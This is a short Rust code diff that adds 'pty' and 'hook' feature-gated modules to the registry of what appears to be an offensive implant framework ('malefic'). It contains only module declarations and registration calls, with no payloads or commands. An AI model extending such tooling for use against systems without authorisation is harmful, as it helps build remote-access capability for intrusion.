@@ -1,11 +1,19 @@
-use malefic_modules::{register_module, MaleficBundle, Module};
-use std::collections::HashMap;
+mod prelude;
 
 #[cfg(feature = "rem")]
 mod rem;
 
 #[cfg(feature = "curl")]
 mod curl;
+
+#[cfg(feature = "pty")]
+mod pty;
+
+#[cfg(feature = "hook")]
+mod hook;
+
+use std::collections::HashMap;
+use prelude::*;
 
 pub extern "C" fn register_3rd() -> MaleficBundle {
     let mut map: MaleficBundle = HashMap::new();
@@ -20,6 +28,10 @@ pub extern "C" fn register_3rd() -> MaleficBundle {
 
     #[cfg(feature = "curl")]
     register_module!(map, "curl", curl::Curl);
+
+    #[cfg(feature = "pty")]
+    register_module!(map, "pty", pty::Pty);
+    
     map
 }
 
